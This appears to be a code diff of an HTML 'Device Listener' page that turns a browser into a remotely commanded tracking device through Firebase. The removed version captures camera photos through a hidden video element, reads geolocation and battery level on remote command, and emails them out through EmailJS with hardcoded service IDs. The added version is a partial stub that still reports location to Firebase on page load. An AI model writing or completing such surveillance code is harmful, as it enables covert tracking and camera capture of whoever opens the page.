@@ -1,102 +1,89 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>Device Listener</title>
-  <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
-  <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
-  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@2.4.1/dist/email.min.js"></script>
-  <script src="firebase-config.js"></script>
-</head>
-<body>
-  <h2>Device Listener</h2>
-  <video id="video" autoplay style="display:none;"></video>
-  <canvas id="canvas" style="display:none;"></canvas>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Listener Page</title>
+  
+  <!-- Firebase SDK -->
+  <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database.js"></script>
 
   <script>
-    emailjs.init("vyxyeBFTfSi_ISmNG");
+    // Firebase Configuration
+    const firebaseConfig = {
+      apiKey: "your-api-key",
+      authDomain: "your-auth-domain",
+      projectId: "your-project-id",
+      storageBucket: "your-storage-bucket",
+      messagingSenderId: "your-sender-id",
+      appId: "your-app-id"
+    };
 
-    const dbRef = db.ref("command");
-    const video = document.getElementById("video");
-    const canvas = document.getElementById("canvas");
-    const ctx = canvas.getContext("2d");
+    // Initialize Firebase
+    const app = firebase.initializeApp(firebaseConfig);
+    const database = firebase.database(app);
 
-    // Generate a unique device ID (you could use the device IP or a random ID)
-    const deviceID = localStorage.getItem("deviceID") || generateDeviceID();
-    localStorage.setItem("deviceID", deviceID);
+    // Device ID generation (creates a unique entry for each device)
+    const deviceId = firebase.database().ref().child('devices').push().key;
 
-    // Register the device with Firebase
-    db.ref("devices/" + deviceID).set({
-      deviceID: deviceID,
-      status: "online"
+    // Register the device in Firebase
+    firebase.database().ref('devices/' + deviceId).set({
+      status: 'online',
+      location: null,
+      photo: null
     });
 
-    dbRef.on("value", async (snapshot) => {
-      const command = snapshot.val();
-      if (!command || !command.action) return;
+    // Listen for updates on the device's entry
+    firebase.database().ref('devices/' + deviceId).on('value', function(snapshot) {
+      const deviceData = snapshot.val();
 
-      if (command.deviceID !== deviceID) return;  // Only listen for commands for this device
-
-      if (command.action === "take_picture") {
-        navigator.geolocation.getCurrentPosition(async (pos) => {
-          const location = `Lat: ${pos.coords.latitude}, Lon: ${pos.coords.longitude}`;
-          const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-          video.srcObject = stream;
-
-          setTimeout(() => {
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            ctx.drawImage(video, 0, 0);
-            const imageData = canvas.toDataURL("image/png");
-
-            emailjs.send("service_gkkpt4w", "template_96dsagv", {
-              message: location,
-              image: imageData
-            }).then(() => alert("Photo + Location sent"))
-              .catch((err) => alert("Email failed: " + JSON.stringify(err)));
-
-            stream.getTracks().forEach(track => track.stop());
-          }, 2000);
-        });
+      if (deviceData.photo === 'take_picture') {
+        // Trigger picture capture
+        takePicture();
       }
 
-      if (command.action === "get_location") {
-        navigator.geolocation.getCurrentPosition((pos) => {
-          const location = `Lat: ${pos.coords.latitude}, Lon: ${pos.coords.longitude}`;
-          emailjs.send("service_gkkpt4w", "template_96dsagv", {
-            message: location,
-            image: ""
-          }).then(() => alert("Location sent"))
-            .catch((err) => alert("Error sending location"));
-        });
-      }
-
-      if (command.action === "get_battery") {
-        navigator.getBattery().then((battery) => {
-          const level = `Battery Level: ${Math.round(battery.level * 100)}%`;
-          emailjs.send("service_gkkpt4w", "template_96dsagv", {
-            message: level,
-            image: ""
-          }).then(() => alert("Battery info sent"))
-            .catch((err) => alert("Battery email failed"));
-        });
-      }
-
-      if (command.action === "show_message") {
-        alert(command.text || "No message provided");
-      }
-
-      if (command.action === "play_sound") {
-        const audio = new Audio("https://actions.google.com/sounds/v1/alarms/beep_short.ogg");
-        audio.play();
+      if (deviceData.location) {
+        // Send current location to Firebase
+        sendLocation(deviceData.location);
       }
     });
 
-    function generateDeviceID() {
-      return "device_" + Math.random().toString(36).substr(2, 9);
+    // Function to take a picture (camera access)
+    function takePicture() {
+      // Implement camera capture functionality here using HTML5 API
+      alert('Picture captured (functionality pending).');
+      
+      // Example of setting the photo in Firebase after capturing it
+      firebase.database().ref('devices/' + deviceId).update({
+        photo: 'image_url'  // Set image URL or placeholder
+      });
     }
+
+    // Function to get the current location
+    function getLocation() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(function(position) {
+          const location = {
+            lat: position.coords.latitude,
+            lon: position.coords.longitude
+          };
+          // Update the location in Firebase
+          firebase.database().ref('devices/' + deviceId).update({
+            location: location
+          });
+        });
+      } else {
+        console.error("Geolocation is not supported by this browser.");
+      }
+    }
+
+    // Call getLocation when the page loads
+    window.onload = getLocation;
   </script>
+</head>
+<body>
+  <h1>Device is online</h1>
+  <p>Waiting for commands...</p>
 </body>
 </html>
-
- 
-        
